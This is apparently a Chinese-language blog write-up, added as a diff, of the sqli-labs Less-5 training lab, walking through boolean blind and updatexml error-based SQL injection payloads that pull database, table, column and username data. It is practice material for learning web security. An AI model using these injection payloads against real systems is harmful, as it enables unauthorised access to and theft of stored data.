@@ -1,0 +1,32 @@
+<h1 id="Less—5-布尔盲注"><a href="#Less—5-布尔盲注" class="headerlink" title="Less—5(布尔盲注)"></a>Less—5(布尔盲注)</h1><p><img src="/assets/image-20250113233740-hp9fm4b.png" alt="image"></p>
+<p>只会回显你已经进入，很明显的布尔盲注</p>
+<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><h2 id="1-检查注入点注入类型"><a href="#1-检查注入点注入类型" class="headerlink" title="1.检查注入点注入类型"></a>1.检查注入点注入类型</h2><blockquote>
+<p><a href="http://127.0.0.1/sqli-labs/Less-5/?id=1">http://127.0.0.1/sqli-labs/Less-5/?id=1</a>‘</p>
+</blockquote>
+<h2 id="2-检查有多少列"><a href="#2-检查有多少列" class="headerlink" title="2.检查有多少列"></a>2.检查有多少列</h2><blockquote>
+<p><a href="http://127.0.0.1/sqli-labs/Less-5/?id=1">http://127.0.0.1/sqli-labs/Less-5/?id=1</a>‘ order by 3–+</p>
+</blockquote>
+<h2 id="3-开始猜测爆破"><a href="#3-开始猜测爆破" class="headerlink" title="3.开始猜测爆破"></a>3.开始猜测爆破</h2><blockquote>
+<p><a href="http://127.0.0.1/sqli-labs/Less-5/?id=1">http://127.0.0.1/sqli-labs/Less-5/?id=1</a>‘ and left((select database()),1)&#x3D;’s’ –+</p>
+</blockquote>
+<p>方法一：采用burpsuite一位一位字符的爆破intruder</p>
+<p>方法二：采用burpsuite转换位ascii码进行爆破，二分法,但是因为在<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">未选择库时候用select database()转化为ascii码时它为NULL，所以是错误的</span></p>
+<blockquote>
+<p>?id&#x3D;1’ ascii(substr((select database()),1,1))&gt;156–+</p>
+<p><img src="/assets/image-20250114002516-rrufe5u.png" alt="image"></p>
+</blockquote>
+<p>方法三：直接爆库名</p>
+<h3 id="报错注入流程"><a href="#报错注入流程" class="headerlink" title="报错注入流程"></a>报错注入流程</h3><blockquote>
+<p>1、寻找注入点		2、判断字符型还是数字型		3、判断闭合方式</p>
+<p><strong>4、使用updatexml查表</strong>  ?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),3) –+  <strong>(0x7e是~，为了使我们找出来的更好的分辨展示出来)为什么要加1和3是因为updatexml函数需要三个参数</strong></p>
+<p>系统执行的语句：SELECT * FROM users WHERE id&#x3D;’1’ and updatexml(1,concat(0x7e,database(),0x7e),3) – ‘ LIMIT 0,1</p>
+<p><strong>5、使用updatexml查找表名</strong></p>
+<p>?id’&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’),0x7e),3) –+</p>
+<p><strong>6、使用updatexmml查询列名</strong></p>
+<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’),3) –+</p>
+<p><strong>7、查询具体数据</strong></p>
+<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),3) –+   <strong>（爆不出全部，因为xpath只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分段输出）</strong></p>
+<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,31),0x7e),3) –+   <strong>(substr也要三个参数，后面两个是爆的范围，group_concat和limit不能一起用)</strong></p>
+</blockquote>
+<p>‍</p>
+<p>详细解释查看布尔盲注</p>
